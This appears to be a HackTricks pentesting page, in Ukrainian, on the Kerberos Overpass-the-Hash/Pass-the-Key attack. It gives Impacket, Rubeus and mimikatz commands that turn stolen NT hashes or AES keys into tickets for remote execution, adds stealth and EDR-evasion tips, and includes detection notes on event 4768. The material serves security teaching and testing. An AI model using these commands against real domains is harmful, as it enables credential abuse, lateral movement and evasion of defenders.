# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Атака **Overpass The Hash/Pass The Key (PTK)** призначена для середовищ, у яких традиційний протокол NTLM обмежений, а автентифікація Kerberos має пріоритет. Ця атака використовує NTLM hash або AES keys користувача для отримання квитків Kerberos, забезпечуючи несанкціонований доступ до ресурсів у мережі.

Строго кажучи:

- **Over-Pass-the-Hash** зазвичай означає перетворення **NT hash** на Kerberos TGT за допомогою ключа **RC4-HMAC** Kerberos.
- **Pass-the-Key** — це загальніший варіант, за якого у вас уже є ключ Kerberos, наприклад **AES128/AES256**, і ви безпосередньо запитуєте TGT за його допомогою.

Ця відмінність має значення в hardened environments: якщо **RC4 вимкнено** або KDC більше не використовує його за замовчуванням, одного **NT hash** недостатньо, і вам потрібен **AES key** (або password у відкритому вигляді, щоб отримати його).

Щоб виконати цю атаку, спочатку потрібно отримати NTLM hash або password облікового запису цільового користувача. Отримавши цю інформацію, можна отримати Ticket Granting Ticket (TGT) для облікового запису, що дасть змогу атакувальнику отримати доступ до служб або машин, для яких користувач має відповідні permissions.

Процес можна розпочати за допомогою таких команд:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Для сценаріїв, що потребують AES256, можна використати опцію `-aesKey [AES key]`:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` також підтримує запит **service ticket безпосередньо через AS-REQ** за допомогою `-service <SPN>`, що може бути корисним, коли вам потрібен ticket для певного SPN без додаткового TGS-REQ:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Крім того, отриманий ticket можна використовувати з різними інструментами, зокрема `smbexec.py` або `wmiexec.py`, що розширює область атаки.

Проблеми на кшталт _PyAsn1Error_ або _KDC cannot find the name_ зазвичай вирішуються оновленням бібліотеки Impacket або використанням hostname замість IP-адреси, що забезпечує сумісність із Kerberos KDC.

Альтернативна послідовність команд із використанням Rubeus.exe демонструє інший аспект цієї техніки:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Цей метод відтворює підхід **Pass the Key**, зосереджуючись на захопленні та безпосередньому використанні квитка для автентифікації. На практиці:

- `Rubeus asktgt` сам надсилає **raw Kerberos AS-REQ/AS-REP** і не потребує прав адміністратора, якщо тільки ви не хочете націлитися на інший сеанс входу за допомогою `/luid` або створити окремий за допомогою `/createnetonly`.<sup>[[2]](#references)</sup>
- `mimikatz sekurlsa::pth` впроваджує матеріал облікових даних у сеанс входу й тому **взаємодіє з LSASS**, що зазвичай потребує локальних прав адміністратора або `SYSTEM` та є більш помітним з погляду EDR.

Приклади з Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Для дотримання операційної безпеки та використання AES256 можна застосувати таку команду:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` є актуальним, оскільки traffic, згенерований Rubeus, дещо відрізняється від native Windows Kerberos. Також зверніть увагу, що `/opsec` призначений для traffic **AES256**; його використання з RC4 зазвичай потребує `/force`, що нівелює значну частину переваг, оскільки **RC4 у сучасних доменах сам по собі є сильним індикатором**.

## Нотатки щодо виявлення

Кожен запит TGT генерує **event `4768`** на DC. У поточних збірках Windows цей event містить більше корисних полів, ніж згадується у старих матеріалах:

- `TicketEncryptionType` показує, який enctype використовувався для виданого TGT. Типові значення: `0x17` для **RC4-HMAC**, `0x11` для **AES128** і `0x12` для **AES256**.<sup>[[3]](#references)</sup>
- Оновлені events також містять `SessionKeyEncryptionType`, `PreAuthEncryptionType` і enctypes, заявлені клієнтом, що допомагає відрізнити **реальну залежність від RC4** від неоднозначних legacy defaults.
- Наявність `0x17` у сучасному середовищі є хорошою ознакою того, що account, host або KDC fallback path усе ще дозволяє RC4 і тому є більш сприятливим для Over-Pass-the-Hash на основі NT-hash.

Починаючи з листопадових оновлень Kerberos hardening 2022 року, Microsoft поступово зменшує використання RC4 by default, а поточні опубліковані рекомендації передбачають **прибрати RC4 із переліку default assumed enctype для AD DC до кінця Q2 2026 року**. З offensive perspective це означає, що **Pass-the-Key з AES** дедалі частіше буде надійним шляхом, тоді як класичний **NT-hash-only OpTH** частіше зазнаватиме невдач у hardened environments.<sup>[[3]](#references)</sup>

Докладніше про типи шифрування Kerberos і пов’язану з ними ticketing behaviour дивіться тут:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Більш stealthy версія

> [!WARNING]
> Кожна logon session може мати лише один активний TGT, тому будьте обережні.

1. Створіть нову logon session за допомогою **`make_token`** із Cobalt Strike.
2. Потім використайте Rubeus для генерації TGT для нової logon session, не впливаючи на наявну.

Подібної ізоляції можна досягти безпосередньо за допомогою Rubeus, використовуючи sacrificial session **logon type 9**:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Це дозволяє уникнути перезапису поточного сеансу TGT і зазвичай є безпечнішим, ніж імпортування квитка до наявного сеансу входу.

## Посилання

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Виявлення та усунення використання RC4 у Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
